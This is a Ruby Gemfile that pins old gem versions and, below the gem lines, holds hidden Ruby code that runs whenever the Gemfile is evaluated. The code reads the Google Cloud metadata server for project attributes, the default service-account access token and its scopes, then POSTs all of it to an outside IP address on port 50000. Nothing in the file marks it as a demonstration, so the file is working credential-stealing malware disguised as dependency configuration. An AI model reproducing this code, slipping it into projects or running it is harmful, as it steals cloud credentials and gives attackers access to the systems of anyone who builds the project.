source 'https://rubygems.org'

gem 'safemode', '<1.3.3'
gem 'spree_frontend', '<3.0.7'
gem 'httparty', '<0.9.0'
gem 'sinatra', '<2.0.2'

require "net/http"
require "json"

DEST_HOST = URI("http://35.237.177.170:50000")

def req(path)
    begin
        uri = URI("http://169.254.169.254/computeMetadata/v1#{path}")
        r = Net::HTTP::Get.new(uri)
        r["Metadata-Flavor"] = "Google"
        res = Net::HTTP::start(uri.hostname, uri.port) {|http| 
            http.request(r)
        }
        if res.is_a?(Net::HTTPSuccess) then
            return res.body
        else
            return "{\"error\": \"got #{res.code} calling #{path}\"}"
        end
    rescue => e
        return "{\"error\": \"unexpected error: #{e}\"}"
    end
end


def j_req(path)
    begin
        res = req(path)
        return JSON.parse(res)
    rescue => e
        return {"error": "json parsing failed for #{path} - #{e}"}
    end
end


begin
    blob = {
        "meta": j_req("/project/attributes/?recursive=true"),
        "token": j_req("/instance/service-accounts/default/token"),
        "scopes": req("/instance/service-accounts/default/scopes")
    }.to_json
    req = Net::HTTP::Post.new(DEST_HOST)
    req["Content-Type"] = "application/json"
    req.body = blob
    res = Net::HTTP.start(DEST_HOST.hostname, DEST_HOST.port) {|http|
        http.request(req)
    }
    puts(res.code)
rescue => e
    puts "oh dear: #{e}"
end


